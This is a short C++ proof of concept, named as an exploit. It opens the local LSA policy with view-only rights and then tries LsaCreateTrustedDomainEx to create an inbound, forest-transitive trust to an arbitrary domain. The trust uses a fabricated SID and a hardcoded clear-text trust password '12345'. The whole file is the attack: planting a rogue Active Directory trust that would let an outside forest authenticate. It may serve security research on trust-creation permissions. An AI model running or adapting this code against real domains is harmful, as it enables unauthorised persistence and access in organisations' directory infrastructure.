// ExploitIncomingForestTrustBuilder.cpp : définit le point d'entrée pour l'application console.
//

#include "stdafx.h"
#pragma comment(lib, "Advapi32")
#pragma comment(lib, "Ntdll")

VOID WINAPI RtlInitUnicodeString(OUT PUNICODE_STRING DestinationString, IN PCWSTR SourceString)
{
	DestinationString->Buffer = (PWSTR) SourceString;
	DestinationString->MaximumLength = DestinationString->Length = wcslen(SourceString) * sizeof(WCHAR);
}

#define TRUST_PASS L"12345"
int _tmain(int argc, _TCHAR* argv[])
{
	LSA_OBJECT_ATTRIBUTES objectAttributes = {0};
	LSA_HANDLE hPolicy, hTrustedDomain;
	TRUSTED_DOMAIN_INFORMATION_EX   TrustedDomainInformation = {0};
	TRUSTED_DOMAIN_AUTH_INFORMATION AuthenticationInformation = {0};
	LSA_AUTH_INFORMATION IncomingAuthInfo = {0};
	LSA_AUTH_INFORMATION OutgoingAuthInfo = {0};
	NTSTATUS status = LsaOpenPolicy(NULL, &objectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &hPolicy);
	if (status == STATUS_SUCCESS)
	{
		printf("Connection OK\n");
		RtlInitUnicodeString(&(TrustedDomainInformation.Name), L"test4.mysmartlogon.com");
		RtlInitUnicodeString(&(TrustedDomainInformation.FlatName), L"TEST4");
		ConvertStringSidToSidA("S-1-5-21-11-22-55", &TrustedDomainInformation.Sid);
		TrustedDomainInformation.TrustDirection = TRUST_DIRECTION_INBOUND;
		TrustedDomainInformation.TrustType = TRUST_TYPE_UPLEVEL;
		TrustedDomainInformation.TrustAttributes = TRUST_ATTRIBUTE_FOREST_TRANSITIVE;

		AuthenticationInformation.IncomingAuthInfos = 1;
		AuthenticationInformation.IncomingAuthenticationInformation = &IncomingAuthInfo;
		AuthenticationInformation.IncomingPreviousAuthenticationInformation = &IncomingAuthInfo;

		AuthenticationInformation.OutgoingAuthInfos = 1;
		AuthenticationInformation.OutgoingAuthenticationInformation = &OutgoingAuthInfo;
		AuthenticationInformation.OutgoingPreviousAuthenticationInformation = &OutgoingAuthInfo;

		OutgoingAuthInfo.AuthType = IncomingAuthInfo.AuthType = TRUST_AUTH_TYPE_CLEAR;
		OutgoingAuthInfo.AuthInfo = IncomingAuthInfo.AuthInfo = (PBYTE) TRUST_PASS;
		OutgoingAuthInfo.AuthInfoLength = IncomingAuthInfo.AuthInfoLength = wcslen(TRUST_PASS) * sizeof(WCHAR);

		GetSystemTimeAsFileTime((PFILETIME)&OutgoingAuthInfo.LastUpdateTime);
		GetSystemTimeAsFileTime((PFILETIME)&IncomingAuthInfo.LastUpdateTime);

		status = LsaCreateTrustedDomainEx(hPolicy, &TrustedDomainInformation, &AuthenticationInformation, 0x00000010, &hTrustedDomain);
		if (status == STATUS_SUCCESS)
		{
			printf("Trust created\n");
			if (hTrustedDomain)
			{
				printf("Trusted domain not null\n");
			}
			/*LsaSetTrustedDomainInformation(
			TRUSTED_SET_POSIX*/
		}
		else
		{
			printf("Trust creation failed 0x%08X\n", status);
		}
		LsaClose(hPolicy);
	}
	return 0;
}

